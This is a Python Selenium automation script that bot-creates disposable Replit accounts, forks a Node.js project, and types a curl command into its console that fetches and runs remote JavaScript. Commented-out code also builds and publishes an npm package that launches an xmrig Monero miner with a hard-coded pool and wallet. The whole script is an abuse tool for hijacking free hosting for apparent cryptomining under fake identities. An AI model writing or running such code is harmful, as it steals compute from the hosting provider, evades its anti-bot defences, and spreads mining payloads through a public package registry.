import undetected_chromedriver as uc
from selenium.webdriver import Chrome
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import random
import json
import os
options = uc.ChromeOptions()

# with open("proxy.txt") as f:
#     lines = f.readlines()
# PROXY = random.choice(lines)

low_word = "abcdefghijklkmnopqrstuvwxyz"
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 12
xdr = "sendelp"

passwordrepl = "rawr12!AAc"





options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
options.user_data_dir = "rawr"
options.add_argument("--window-size=1920,1080")
options.add_argument('--user-data-dir=rawr')
options.add_argument("--remote-debugging-port=38223")
driver = uc.Chrome(options=options, version_main=102)  # version_main allows to specify your chrome version instead of following chrome global version
driver.set_window_size(1920, 1080)

print("rawr")
usernamerepl = "".join(random.sample(username_for, long_username))
emailrepl = "".join(random.sample(username_for, long_username))+"@cldkid.com"
a = True
az = True
time.sleep(3)
driver.get('https://replit.com/logout')
driver.switch_to.window(driver.window_handles[0])
time.sleep(1)
driver.get('https://replit.com/signup?from=landing')
time.sleep(3)
driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[2]/div/input").send_keys(usernamerepl)
time.sleep(1)
driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[3]/div/input").send_keys(emailrepl)
time.sleep(1)
driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[4]/div/input").send_keys(passwordrepl)
time.sleep(1)
driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[5]/button").click()
time.sleep(1)
timez = int(time.time())+300
while a==True:
    try:
        if(driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[5]/button/span").text=="Create account"):
            time.sleep(1)
            driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[5]/button").click()
    except:
        pass
    if(timez<int(time.time())):
        cockz
    if(driver.current_url.startswith("https://replit.com/signup")):
        time.sleep(0.4)
    else:
        a = False
time.sleep(3)
driver.get("https://replit.com/@replit/Nodejs?v=1")
time.sleep(3)
driver.execute_script("""function getElementByXpath(path){return document.evaluate(path,document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue}getElementByXpath("/html/body/div[1]/div/main/div[3]/div/div/div[2]/div/button[1]").click();""")
time.sleep(8)

while az==True:
    time.sleep(1)
    try:
        driver.find_element_by_xpath("/html/body/div[3]/div/div[1]/button").click()
        time.sleep(1)
        az = False
    except:
        pass

# xd = {
#     "name": xdr,
#     "version": "0.1.91",
#     "description": "Easy to use npm NodeJS Monero Miner with C++, uses XMRIG for highspeed hashing.",
#     "main": "./server/src/index.js",
#     "scripts": {
#     "postinstall": "cd server && npm i",
#     "client-start": "cd     ./client && npm start",
#     "server-start": "cd ./server && npm start",
#     "test": "echo \"Error: no test specified\" && exit 1",
#     "XMR-TEMP": "xmrig.exe --donate-level 1 -o xmrpool.eu:9999 -u 47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8 -k --tls"
#   },
#   "repository": {
#     "type": "git",
#     "url": "git+https://github.com/DutchKevv/Overhead2Crypto.git"
#   },
#   "author": "H.K.Brandsma",
#   "license": "ISC",
#   "bugs": {
#     "url": "https://github.com/DutchKevv/Overhead2Crypto/issues"
#   },
#   "homepage": "https://github.com/DutchKevv/Overhead2Crypto#readme",
#   "keywords": [
#     "monero",
#     "xmr",
#     "xmrig",
#     "mining",
#     "easy",
#     "fast",
#     "c++",
#     "node"
#   ]
# }
# json_string = json.dumps(xd)
# with open('vvhi.json', 'w') as outfile:
#     outfile.write(json_string)

# os.system("cp vvhi.json /home/idot/test/node_modules/eazyminer-fsdjufhsdjf/package.json && cd /home/idot/test/node_modules/eazyminer-fsdjufhsdjf/ && npm publish")
time.sleep(1)
driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[10]/div/div[2]").click()
time.sleep(2)
driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("curl https://raw.githubusercontent.com/awaprimPL/expert-guacamole/main/a.js -o index.js")
driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("sed -i 's/UNDEFINED/"+xdr+"/' index.js")
driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
time.sleep(1)
driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[2]/div/div/div").click()
time.sleep(10)

namerepl = driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[3]/span").text
username = driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[1]/span/a").text
namerepl = namerepl.replace(".", "")
print("https://replit.com/@"+username+"/"+namerepl+"?v=1")
input("hi")
